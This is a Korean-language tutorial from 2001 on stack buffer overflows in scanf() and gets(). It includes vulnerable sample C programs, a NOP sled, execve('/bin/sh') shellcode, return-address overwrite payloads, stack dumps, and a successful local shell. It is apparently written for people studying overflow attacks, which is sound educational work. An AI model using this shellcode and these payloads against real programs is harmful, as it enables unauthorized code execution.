@@ -1,0 +1,293 @@
+ ===================================================================================
+ Title : 일반적인 문자열 입력함수에서 일어나는 Stack Overflow
+ Author : 유동훈 (Xpl017Elz)
+ E-mail : szoahc@hotmail.com
+ Home: http://x82.i21c.net
+ Date : f. 2001/3/02 s. 2001 /9/28
+ ===================================================================================
+
+ 작자주: 이 문서는 Overflow attack에 대해 공부하는 이들을 위해 제작되었습니다. 
+ 만약, 문서의 내용중 오류가 있다면 szoahc@hotmail.com으로 mail 주시면 감사하겠습니다.
+
+ 일반적인 문자열 입력함수에서 일어나는 Stack Overflow.
+
+ #include <stdio.h>
+ int scanf (const char *format,...); 
+
+ scanf(): format 형태로 stdin(표준입력)을 받는다.
+ 입력형태에 따라서 배열에 저장되는것이 다르다.
+
+ 문자열형으로 입력받을시 [&] 연산자를 넣지않아도 된다.
+ 이는 문자열을 입력받는 변수 S_value가 문자열 배열이기 때문이다.
+ 배열의 배열명은, 배열 첫번째 요소의 주소값인 셈이된다.
+
+ S_value==&S_value[0]
+
+ 다음과 같은 입력형태는 "INPUT INPUT INPUT" 이란 문자열을 입력했을때 일어나는 현상이다.
+ scanf()함수는 공백문자를 포함한 문자열을 전부 인식하지 않는다.
+
+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ +---+         +---+
+ | I | | N | | P | | U | | T | | \0| |   | |   |  공백   |   |
+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ ... ... +---+
+
+ 위 그림을 잘 염두해두도록 하자.
+ 공백을 포함한 문자열을 모두 받기위해서는 gets()함수를 사용한다.
+
+ 기존에 일어나는 문자열복사 strcpy() 함수버그와는 약간 다른형태를 띤다.
+ 
+ +--+ +--+ +--+ +--+     +--+ +--+ +--+ +--+ +--+ +--+ +--+ +--+ +--+
+ |00| |01| |02| |03|     |00| |01| |02| |03| |04| |05| |06| |07| |08|
+ +--+ +--+ +--+ +--+     +--+ +--+ +--+ +--+ +--+ +--+ +--+ +--+ +--+
+ 
+   |_____________|         |_______________________________________|
+          |                                   |
+       dest: 4byte                         src: 8byte
+
+ 8byte가 4byte에 덮어씌워지면서 4byte가 전혀 예상하지 못하는 값으로 Overwrite 된다.
+ 위 같은방식으로 영역이 덮어씌워져 버그를 야기한다.
+
+ 물론 scanf(),gets() ... 입력함수들도 비슷한 버그를 가지고 있다.
+ 처음에 값을 받으려면 문자열을 저장할 공간을 필요로 하게된다. 이때 변수초기화 및 선언은
+ 다음과 같이 이루어진다.
+
+ char values[20];
+ char buf[100];
+
+ 이를 초과함으로써 우리는 이득을 볼수있는것이다.
+ 다음의 Source를 살펴보자. 보통 입력함수 부분의 scanf() 계열을 설명할때,
+ C 언어책에서 자주 소개되는 당골 Default Source이다.
+
+ #include <stdio.h>
+ main() {
+ char input[100];
+ printf("\n\tINPUT: "); 
+ scanf("%s",input);
+ printf("\n\tPRINTING: %s\n\n",input);
+ }
+
+ 위의 Source를 Compile해서 실행해보면,
+
+ [x82@xpl017elz bug]$ ./scanf
+ 
+         INPUT: INPUT INPUT INPUT
+
+         PRINTING: INPUT     
+
+ 역시 공백문자열을 받지 못한다. Overflow의 취약점이 존재하는지 확인해보자.
+ 
+ [x82@xpl017elz bug]$ ./scanf
+ 
+         INPUT: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ 
+         PRINTING: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxx
+
+ Segmentation fault  
+ [x82@xpl017elz bug]$
+
+ 역시나 저장된 배열변수 input[100] 이상으로 값을 입력하면 Segmentation fault가 
+ 일어난다. 간단히 exploit 시켜보자.
+
+ input[100] - [NOP]+[Shellcode] : 여기까지 100byte 안에 모조리 넣어야 한다.
+             +[Inputdata]+[&Shellcode]
+
+ 정확히 계산하여 한번에 성공해보자. 변경되는 Stack의 내용을 한눈에 쉽게보기위해
+ dumpcode.h를 이용하겠다. MS-DOS상에서 debug.exe를 사용해본 유저하면 출력되는 내용을
+ 쉽게 알아볼수 있을것이다.
+
+ 다음과 같이 test exploit을 한다.
+
+ NOP(66byte):
+
+ \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+ \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+ \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+ \x90\x90\x90\x90\x90\x90
+
+ Shellcode(24byte):
+
+ \x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d
+ \x42\x0b\xcd\x80
+
+ NOP(10byte):
+
+ \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+
+ $ebp(4byte), $ret(4byte):
+
+ xxxx\xc8\xef\xff\xbf
+
+ 입력을 시켜보도록 하겠다.
+
+ [x82@xpl017elz bug]$ ./scanf
+ 
+        INPUT:
+ [x82@xpl017elz bug]$ (printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
+ 90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
+ 90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
+ 90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xd2\x52\x68\x6e\x2f\x
+ 73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80\x90\x90\x
+ 90\x90\x90\x90\x90\x90\x90\x90xxxx\xc8\xef\xff\xbf";cat)|./scanf
+ 
+         INPUT:
+         PRINTING: 릱릱륛릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱
+ 릱릱1?hn/shh//bi됥RS됣
+ 0xbfffefb4  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
+ 0xbfffefc4  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
+ 0xbfffefd4  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
+ 0xbfffefe4  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
+ 0xbfffeff4  90 90 31 d2 52 68 6e 2f 73 68 68 2f 2f 62 69 89   ..1.Rhn/shh//bi.
+ 0xbffff004  e3 52 53 89 e1 8d 42 00 2b 84 04 08 08 97 04 08   .RS...B.+.......
+ 0xbffff014  1c 97 04 08 38 f0 ff bf fb 11 03 40 01 00 00 00   ....8......@....
+ 0xbffff024  64 f0 ff bf 6c f0 ff bf 24 20 01 40 01 00 00 00   d...l...$ .@....
+ 0xbffff034  90 83 04 08 00 00 00 00 b1 83 04 08 24 86 04 08   ............$...
+ 0xbffff044  01 00 00 00 64 f0                                 ....d.
+  
+ [x82@xpl017elz bug]$ 
+
+ 오우...이런 맙소사... Shellcode의 내용중에 공백을 포함한 문자가 존재하는것같다.
+ Shellcode가 input[100] 영역에 Overwrite 되던중에 주소값 0xbffff00b 부분서 부터 
+ 멈추었다. 
+
+ ... e3 52 53 89 e1 8d 42 00 <- 원래 0x0b가 들어가야되는 부분.
+
+ 아마도 이 부분을 공백문자열로 인식하는것 같다. gets()의 Overflow시에는 공백을 포함한
+ 문자열까지 모조리 인식하므로 위같은 문제가 발생하진 않을것이다.
+
+ 예제:
+
+ [x82@xpl017elz bug]$ (printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
+ 90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
+ 90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
+ 90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xd2\x52\x68\x6e\x2f\x
+ 73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80\x90\x90\x
+ 90\x90\x90\x90\x90\x90\x90\x90xxxxxxxx";cat)|./gets
+  
+         INPUT:
+         PRINTING: 릱릱륛?릱릱릱릱릱xxxx흥퓧릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱
+ 릱릱1?hn/shh//bi됥RS됣
+ 0xbfffefb4  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
+ 0xbfffefc4  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
+ 0xbfffefd4  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
+ 0xbfffefe4  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
+ 0xbfffeff4  90 90 31 d2 52 68 6e 2f 73 68 68 2f 2f 62 69 89   ..1.Rhn/shh//bi.
+ 0xbffff004  e3 52 53 89 e1 8d 42 0b cd 80 90 90 90 90 90 90   .RS...B.........
+ 0xbffff014  90 90 90 90 78 78 78 78 78 78 78 78 00 00 00 00   ....xxxxxxxx....
+ 0xbffff024  64 f0 ff bf 6c f0 ff bf 24 20 01 40 01 00 00 00   d...l...$ .@....
+ 0xbffff034  90 83 04 08 00 00 00 00 b1 83 04 08 24 86 04 08   ............$...
+ 0xbffff044  01 00 00 00 64 f0                                 ....d.
+ 
+ [x82@xpl017elz bug]$
+
+ 역시나 정상적으로 보기좋게 Overwrite 되었다. 다시, scanf() Overflow로 돌아와서...
+
+ 100byte라는 공간은 쉽게 활용하기 힘들것같다. 이번엔 다른 방법으로 환경변수에
+ shellcode의 주소를 저장해주는 편리한 eggshell 프로그램으로 시도해보자.
+ Source는 이미 인터넷상에 많이 공개되있기 때문에 따로 준비하지는 않겠다.
+
+ [x82@xpl017elz bug]$ ./eggshell
+ Using address: 0xbffff9b8
+ [x82@xpl017elz bug]$ 
+
+ 실행후 shellcode가 띄워져있는 위치가 출력되었다. 물론 저 주소는 NOP를 가리키고 있는 
+ 부분일수도 있다. 
+
+ 공격을 재시도 해보도록 하겠다. 
+
+ 'x'x100 (input) + xxxx ($ebp) + \xb8\xf9\xff\xbf ($ret) 
+                                         |
+                                         +---> Shellcode Address
+
+ [x82@xpl017elz bug]$ (printf "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\xb8\xf9\xff\xbf";cat)|./scanf
+ 
+        INPUT:
+        PRINTING: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx몽□
+
+ 0xbfffef84  78 78 78 78 78 78 78 78 78 78 78 78 78 78 78 78   xxxxxxxxxxxxxxxx
+ 0xbfffef94  78 78 78 78 78 78 78 78 78 78 78 78 78 78 78 78   xxxxxxxxxxxxxxxx
+ 0xbfffefa4  78 78 78 78 78 78 78 78 78 78 78 78 78 78 78 78   xxxxxxxxxxxxxxxx
+ 0xbfffefb4  78 78 78 78 78 78 78 78 78 78 78 78 78 78 78 78   xxxxxxxxxxxxxxxx
+ 0xbfffefc4  78 78 78 78 78 78 78 78 78 78 78 78 78 78 78 78   xxxxxxxxxxxxxxxx
+ 0xbfffefd4  78 78 78 78 78 78 78 78 78 78 78 78 78 78 78 78   xxxxxxxxxxxxxxxx
+ 0xbfffefe4  78 78 78 78 78 78 78 78 b8 f9 ff bf 00 00 00 00   xxxxxxxx........
+ 0xbfffeff4  34 f0 ff bf 3c f0 ff bf 24 20 01 40 01 00 00 00   4...<...$ .@....
+ 0xbffff004  90 83 04 08 00 00 00 00 b1 83 04 08 24 86 04 08   ............$...
+ 0xbffff014  01 00 00 00 34 f0                                 ....4.
+                                                                               
+ id
+ uid=500(x82) gid=500(x82) groups=500(x82)
+ 
+ 드디어... shell을 띄우기에 성공했다.
+ Return address가 "b8 f9 ff bf"으로 변경되므로써 eggshell로 띄운 shellcode가 
+ 정상작동한것이다. :-)
+
+[x82@xpl017elz bug]$ cat getpass.c
+ #include <stdio.h>
+ #include <dumpcode.h>
+ main()              {
+  
+ char     passinput[100],
+          passtoinput[100];
+  
+ printf("Password: "); scanf("%s",passinput);
+ dumpcode((char*)passinput,150);
+ printf("Password: ");
+ scanf("%s",passtoinput);
+ dumpcode((char*)passtoinput,150);
+ printf("%s & %s\n",passinput,passtoinput);
+ }
+ [x82@xpl017elz bug]$   
+
+ 위의 Source를 Compile하여 공격해보아도 똑같이 shell을 띄울수 있다.
+ 한가지 재미있는 사실은 passtoinput,passinput 변수가 차례로 Stack에 저장되는점인데,
+ Stack은 거꾸로 저장된다. 그 사실을 확인시켜주겠다.
+
+ [x82@xpl017elz bug]$ ./getpass
+ Password: x0x
+ 0xbfffef84  78 30 78 00 c0 ef ff bf 9d 9f 00 40 c7 03 01 40   x0x........@...@
+             ~~~~~~~~~~~
+ 0xbfffef94  48 2e 01 40 07 00 00 00 ee 9e 00 40 54 97 04 08   H..@.......@T...
+ 0xbfffefa4  00 a6 00 40 34 f0 ff bf b0 26 01 40 e0 81 04 08   ...@4....&.@....
+ 0xbfffefb4  60 97 04 08 58 82 04 08 f4 26 02 40 e8 ef ff bf   `...X....&.@....
+ 0xbfffefc4  10 a1 00 40 4b 80 0f 40 54 97 04 08 00 a6 00 40   ...@K..@T......@
+ 0xbfffefd4  34 f0 ff bf e8 ef ff bf 2b 84 04 08 40 97 04 08   4.......+...@...
+ 0xbfffefe4  54 97 04 08 08 f0 ff bf fb 11 03 40 01 00 00 00   T..........@....
+ 0xbfffeff4  34 f0 ff bf 3c f0 ff bf 24 20 01 40 01 00 00 00   4...<...$ .@....
+ 0xbffff004  90 83 04 08 00 00 00 00 b1 83 04 08 24 86 04 08   ............$...
+ 0xbffff014  01 00 00 00 34 f0                                 ....4.
+ Password: x82
+ 0xbfffef20  78 38 32 00 01 00 00 00 40 ef ff bf e0 81 04 08   x82.....@.......
+ 0xbfffef30  b4 28 01 40 0f 53 8e 07 bc ef ff bf 58 82 04 08   .(.@.S......X...
+ 0xbfffef40  f4 26 02 40 a8 2b 01 40 cc ef ff bf bf 6b 02 40   .&.@.+.@.....k.@
+ 0xbfffef50  64 f5 01 40 a8 2b 01 40 f4 0c 02 40 a8 2b 01 40   d..@.+.@...@.+.@
+ 0xbfffef60  b4 28 01 40 8e ff 77 01 ec ef ff bf 46 82 04 08   .(.@..w.....F...
+ 0xbfffef70  f4 1f 02 40 a8 2b 01 40 e6 ff ff bf e0 ef ff bf   ...@.+.@........
+ 0xbfffef80  1f 00 00 00 78 30 78 00 c0 ef ff bf 9d 9f 00 40   ....x0x........@
+                         ~~~~~~~~~~~ passinput의 시작부분.
+ 0xbfffef90  c7 03 01 40 48 2e 01 40 07 00 00 00 ee 9e 00 40   ...@H..@.......@
+ 0xbfffefa0  54 97 04 08 00 a6 00 40 34 f0 ff bf b0 26 01 40   T......@4....&.@
+ 0xbfffefb0  e0 81 04 08 60 97                                 ....`.
+ x0x & x82
+ [x82@xpl017elz bug]$               
+ 
+ 위의 주소값들이 보이는가? 첫번째로 입력받아 저장한 변수는 passinput, 두번째로 입력받아
+ 저장한 변수는 passtoinput 이다. Source를 살펴보면 알수있을것이다.
+ 
+ 그러나 위의 Stackcode를 dump해보면 저장된 passtoinput 100byte가 passinput 100byte 보다
+ 먼저 저장되었다는 사실을 알수있게된다. passtoinput 영역은 0xbfffef20 부터 시작한다.
+ 그리고 뒤로부터 200byte 쌓인후엔 $ebp와 $ret영역이 존재하고 있다. 이 영역은 이미 passinput
+ 영역을 지난 8byte 뒷부분이다.
+
+ code를 dump 해보니... 떠돌던 이론이 사실이란게 밝혀졌음. 
+ 역시 Stack은 거꾸로 쌓이고 있었다. :-D
+
+ 단, 값은 바로 쓰여진다. 착오없길 바란다.
+
